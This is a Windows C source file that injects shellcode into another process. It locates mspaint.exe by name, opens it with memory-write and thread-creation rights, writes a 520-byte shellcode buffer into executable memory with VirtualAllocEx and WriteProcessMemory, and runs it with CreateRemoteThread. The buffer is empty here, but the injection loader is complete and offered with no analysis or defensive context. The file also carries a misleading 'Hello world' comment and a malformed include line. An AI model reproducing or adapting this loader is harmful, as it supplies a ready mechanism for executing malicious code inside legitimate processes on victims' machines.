#include<windows.h>
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<tlhelp32.h>>

//Hello world
unsigned char myShellCode[520] = {
	
				

};

unsigned int lengthOfShellCodePayload = 520;

int SearchForProcess(const char *processName)
{
    HANDLE hSnapshotOfProcesses;
    PROCESSENTRY32 processStruct;
    int pid = 0;
    
    hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) {
        printf("Error: Unable to create snapshot of processes.\n");
        getchar();
        return 0;
    }
    
    processStruct.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
        printf("Error: Unable to retrieve the first process in the snapshot.\n");
        getchar();
        CloseHandle(hSnapshotOfProcesses);
        return 0;
    }
    
    while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
        if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
            pid = processStruct.th32ProcessID;
            break;
        }
    }
    
    CloseHandle(hSnapshotOfProcesses);
    
    return pid;
}

int ShellInject(HANDLE hProcess, unsigned char * shellcodePayload, unsigned int lengthOfShellCodePayload)
{
	LPVOID pRemoteProcAllocMem = NULL;
	HANDLE hThread = NULL;
	
	    pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, lengthOfShellCodePayload, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProcess, pRemoteProcAllocMem, (PVOID)myShellCode, (SIZE_T)lengthOfShellCodePayload, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteProcAllocMem, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

int main(void)
{
	int pid = 0;
	HANDLE hProcess = NULL;
	
	pid = SearchForProcess("mspaint.exe");
	
	if(pid)
	{
		printf("mspaint.exe PID: %d\n", pid);
		//getchar();
		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
					PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
					FALSE, (DWORD) pid);

		if (hProcess != NULL) {
			printf("Injecting");
			getchar();
			ShellInject(hProcess, myShellCode, lengthOfShellCodePayload);
			CloseHandle(hProcess);
		}
	}
	return 0;
	
}





